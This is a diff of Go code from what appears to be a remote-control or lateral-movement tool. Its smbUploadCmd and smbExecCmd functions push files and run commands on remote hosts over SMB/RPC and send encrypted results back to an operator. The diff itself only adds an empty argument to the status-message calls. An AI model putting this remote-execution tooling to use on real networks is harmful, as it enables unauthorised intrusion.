@@ -56,7 +56,7 @@ func smbUploadCmd(sendUserId, decData string) {
 		case metaData := <-m:
 			pSaveFile.Write(metaData.([]byte))
 		case <-time.After(5 * time.Second):
-			common.SendFailMsg(sendUserId, common.ClientId, "file upload failed", "")
+			common.SendFailMsg(sendUserId, common.ClientId, "file upload failed", "", "")
 			debug.DebugPrint(sendUserId + " upload file error")
 			setchannel.DeleteFileSliceDataChan(sendUserId)
 			return
@@ -78,7 +78,7 @@ func smbUploadCmd(sendUserId, decData string) {
 			msg := fmt.Sprintf("Login failed [%s]: %s", ip, err.Error())
 			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, msg)
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg, "")
 			return
 		}
 		defer session.Close()
@@ -92,7 +92,7 @@ func smbUploadCmd(sendUserId, decData string) {
 		if err != nil {
 			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "rpc connection establishment failed")
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg, "")
 			return
 		}
 		rpc.Client = *session
@@ -100,16 +100,16 @@ func smbUploadCmd(sendUserId, decData string) {
 		if err != nil {
 			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "file upload failed")
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg, "")
 			return
 		}
 		data := authMsg + colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "file upload success")
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendSuccessMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
+		common.SendSuccessMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg, "")
 	} else {
 		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "file upload failed")
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg, "")
 	}
 }
 
@@ -138,7 +138,7 @@ func smbExecCmd(sendUserId, decData string) {
 			message := fmt.Sprintf("failed to run shell: %v", err)
 			output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 			var retData, _ = crypto.Encrypt([]byte(output), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
+			common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData, "")
 			return
 		}
 		debug.DebugPrint(out)
@@ -146,10 +146,10 @@ func smbExecCmd(sendUserId, decData string) {
 		message := fmt.Sprintf("command execution timed out")
 		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
 		var retData, _ = crypto.Encrypt([]byte(output), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
+		common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData, "")
 		return
 	}
 	output := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "command executed successfully")
 	retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "sshRun_ret", retData, "")
 }
